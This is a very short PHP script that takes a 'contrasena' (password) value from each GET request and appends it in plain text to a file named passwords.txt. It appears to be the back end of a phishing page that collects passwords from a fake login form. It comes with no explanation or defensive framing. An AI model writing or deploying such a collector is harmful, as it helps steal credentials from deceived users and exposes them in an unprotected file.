<?php 

if ($_SERVER['REQUEST_METHOD']=='GET') {
		$fp = fopen('passwords.txt', 'a');
		fwrite($fp, $_GET['contrasena']."\n");
		fclose($fp);
}
 ?>